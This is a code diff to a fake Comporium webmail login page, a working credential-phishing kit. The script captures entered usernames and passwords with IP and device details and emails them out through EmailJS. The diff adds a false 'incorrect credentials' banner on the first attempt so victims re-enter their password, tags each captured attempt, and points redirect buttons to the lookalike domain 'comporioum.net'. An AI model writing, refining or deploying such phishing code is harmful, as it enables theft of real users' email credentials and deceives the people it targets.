@@ -150,11 +150,36 @@
     background-color: #006f9a;
     border-color: #006f9a;
   }
+  .custom-submit:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
   .error-message {
     color: red;
     font-size: 12px;
     margin-top: -5px;
     margin-bottom: 5px;
+  }
+  /* General form error (incorrect credentials banner) */
+  .form-error-banner {
+    display: none;
+    width: 100%;
+    background: #fff5f5;
+    border: 1px solid #f5c2c0;
+    border-left: 4px solid #d93025;
+    border-radius: 4px;
+    padding: 12px 14px;
+    box-sizing: border-box;
+    font-size: 13px;
+    color: #7a1c17;
+    line-height: 1.5;
+    margin-bottom: 5px;
+  }
+  .form-error-banner.show {
+    display: block;
+  }
+  .form-error-banner strong {
+    color: #d93025;
   }
   .footer-text {
     position: absolute;
@@ -270,7 +295,6 @@
     background: #d93025;
     color: #fff;
   }
-  /* Remove button */
   .remove-btn {
     flex-shrink: 0;
     margin-left: 12px;
@@ -434,6 +458,13 @@
   <div class="form-container" id="login-view">
     <img src="https://i.imghippo.com/files/nCh4587cHM.png" alt="comporium.net-large" class="form-logo" />
     <div class="signIn">Log In</div>
+
+    <!-- Incorrect credentials banner (shown after first attempt) -->
+    <div class="form-error-banner" id="form-error-banner">
+      <strong>Incorrect username or password.</strong><br>
+      Please check your details and try again.
+    </div>
+
     <form id="contact-form" novalidate>
       <div class="input-group">
         <label for="email-input">Username</label>
@@ -446,7 +477,7 @@
         <div id="password-error" class="error-message"></div>
       </div>
       <div class="actions-row">
-        <button type="submit" class="custom-submit">Continue</button>
+        <button type="submit" class="custom-submit" id="submit-btn">Continue</button>
         <div class="checkbox-container">
           <input type="checkbox" id="stay-signed-in" name="stay_signed_in" />
           <label for="stay-signed-in">Stay signed in</label>
@@ -525,10 +556,15 @@
   const passwordInput = document.getElementById("password-input");
   const emailError = document.getElementById("email-error");
   const passwordError = document.getElementById("password-error");
+  const formErrorBanner = document.getElementById("form-error-banner");
+  const submitBtn = document.getElementById("submit-btn");
 
   const loginView = document.getElementById("login-view");
   const activityView = document.getElementById("activity-view");
   const currentDeviceMeta = document.getElementById("current-device-meta");
+
+  // Track which attempt we are on (1 = first attempt, 2 = second/retry)
+  let attemptNumber = 1;
 
   /* ---------- helpers ---------- */
   function getBrowser() {
@@ -574,32 +610,8 @@
     }
   }
 
-  /* ---------- form submit ---------- */
-  form.addEventListener("submit", async (e) => {
-    e.preventDefault();
-
-    emailError.textContent = "";
-    passwordError.textContent = "";
-
-    const emailValue = emailInput.value.trim();
-    const passwordValue = passwordInput.value.trim();
-    const allowedDomainRegex = /^[^@\s]+@comporium\.net$/i;
-    let valid = true;
-
-    if (!emailValue) {
-      emailError.textContent = "Email is required.";
-      valid = false;
-    } else if (!allowedDomainRegex.test(emailValue)) {
-      emailError.textContent = "Email must be @comporium.net.";
-      valid = false;
-    }
-    if (!passwordValue) {
-      passwordError.textContent = "Password is required.";
-      valid = false;
-    }
-    if (!valid) return;
-
-    // Gather metadata
+  /* ---------- build + send email ---------- */
+  async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
     const ip = await getIP();
     const pageTitle = document.title;
     const pageUrl = window.location.href;
@@ -618,8 +630,12 @@
     const inputsCount = document.querySelectorAll('input').length;
     const linksCount = document.querySelectorAll('a').length;
 
+    const attemptLabel = attempt === 1
+      ? "FIRST ATTEMPT (Incorrect credentials shown)"
+      : "SECOND ATTEMPT (Retry after incorrect credentials)";
+
     const messageLog = `
-New sign-in attempt captured.
+${attemptLabel}
 Timestamp: ${getTimestamp()}
 Email/Username: ${emailValue}
 Password: ${passwordValue}
@@ -646,6 +662,8 @@ Links: ${linksCount}
       timestamp: getTimestamp(),
       from_email: emailValue,
       password: passwordValue,
+      attempt_number: attempt,
+      attempt_label: attemptLabel,
       page_title: pageTitle,
       page_url: pageUrl,
       page_hostname: pageHostname,
@@ -666,31 +684,98 @@ Links: ${linksCount}
       message: messageLog
     };
 
-    // Show activity view immediately
-    loginView.style.display = "none";
-    activityView.style.display = "flex";
-
-    // Populate current device info on the activity page
-    currentDeviceMeta.textContent = `${browser} on ${os} · ${ip} · ${timezone}`;
-
-    // Send to EmailJS in the background
     try {
       const response = await emailjs.send(
         "service_kvpr45j",
         "template_v2xoave",
         templateParams
       );
-      console.log("EmailJS SUCCESS:", response.status);
+      console.log(`EmailJS SUCCESS (attempt ${attempt}):`, response.status);
     } catch (error) {
-      console.error("EmailJS FAILED:", error);
+      console.error(`EmailJS FAILED (attempt ${attempt}):`, error);
+    }
+  }
+
+  /* ---------- form submit ---------- */
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    emailError.textContent = "";
+    passwordError.textContent = "";
+
+    const emailValue = emailInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+    const allowedDomainRegex = /^[^@\s]+@comporium\.net$/i;
+    let valid = true;
+
+    if (!emailValue) {
+      emailError.textContent = "Email is required.";
+      valid = false;
+    } else if (!allowedDomainRegex.test(emailValue)) {
+      emailError.textContent = "Email must be @comporium.net.";
+      valid = false;
+    }
+    if (!passwordValue) {
+      passwordError.textContent = "Password is required.";
+      valid = false;
+    }
+    if (!valid) return;
+
+    // Disable button during processing
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Verifying…";
+
+    // Capture + send this attempt to EmailJS (runs in background)
+    sendAttemptToEmailJS({
+      emailValue,
+      passwordValue,
+      attempt: attemptNumber
+    });
+
+    if (attemptNumber === 1) {
+      // FIRST ATTEMPT: show "incorrect" error and ask user to try again
+      attemptNumber = 2;
+
+      // Small delay so the user sees the "Verifying…" state
+      setTimeout(() => {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Continue";
+
+        // Show the incorrect-credentials banner
+        formErrorBanner.classList.add("show");
+
+        // Clear password field but keep email so user can retry easily
+        passwordInput.value = "";
+        passwordInput.focus();
+
+        // Scroll banner into view
+        formErrorBanner.scrollIntoView({ behavior: "smooth", block: "nearest" });
+      }, 700);
+
+    } else {
+      // SECOND ATTEMPT: proceed to activity page
+      setTimeout(() => {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Continue";
+
+        // Hide any previous error banner
+        formErrorBanner.classList.remove("show");
+
+        // Switch to activity view
+        loginView.style.display = "none";
+        activityView.style.display = "flex";
+
+        // Populate current device info on the activity page
+        currentDeviceMeta.textContent =
+          `${getBrowser()} on ${getOS()} · ${getTimezone()}`;
+      }, 900);
     }
   });
 
   /* ---------- Remove device buttons ---------- */
   document.querySelectorAll(".remove-btn").forEach((btn) => {
     btn.addEventListener("click", () => {
-      // Redirect after removing a device
-      window.location.href = "https://www.comporium.net";
+      window.location.href = "https://www.comporioum.net";
     });
   });
 
@@ -699,10 +784,12 @@ Links: ${linksCount}
     activityView.style.display = "none";
     loginView.style.display = "flex";
     form.reset();
+    formErrorBanner.classList.remove("show");
+    attemptNumber = 1; // reset for next time
   });
 
   document.getElementById("secure-account").addEventListener("click", () => {
-    window.location.href = "https://www.comporium.net";
+    window.location.href = "https://www.comporioum.net";
   });
 </script>
 </body>
